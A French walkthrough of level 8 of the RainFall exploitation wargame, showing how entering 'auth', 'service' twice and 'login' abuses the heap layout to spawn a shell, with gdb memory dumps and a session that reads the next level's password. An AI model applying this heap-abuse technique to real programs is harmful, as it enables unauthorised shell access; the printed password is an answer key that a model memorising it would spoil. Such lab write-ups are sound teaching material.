# Level8

On constate que le programme est une boucle qui change de comportement en fonction des entrees clavier.
Le programme verifie que "auth " est entre pour initialise "auth" alouer 4 octets et mettre auth[0] a 0 a l'adresse "0x804a008", puis copie input+5 dans auth (ici 0x0a equivalent a line feed)

Quand nous entrons "service" une premiere fois une adresse est allouee sur le tas, service se situe a auth[16] ("0x804a018") et une line feed y est inscrit (input + 7 = service_ <-).
Il suffit d'entrer une nouvelle fois service pour allouee la meme chose a l'adresse a auth[32] ("0x804a028").

En entrant login nous passons donc dans la condition car auth[32] vaut "0x0a" et != 0 , un bash est lancé.

```
0x804a028:      0x00000000
(gdb) c
Continuing.
service
0x804a008, 0x804a028

Breakpoint 1, 0x08048596 in main ()
(gdb) x/x 0x804a028
0x804a028:      0x0000000a <=== apres deuxieme "service"
```

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```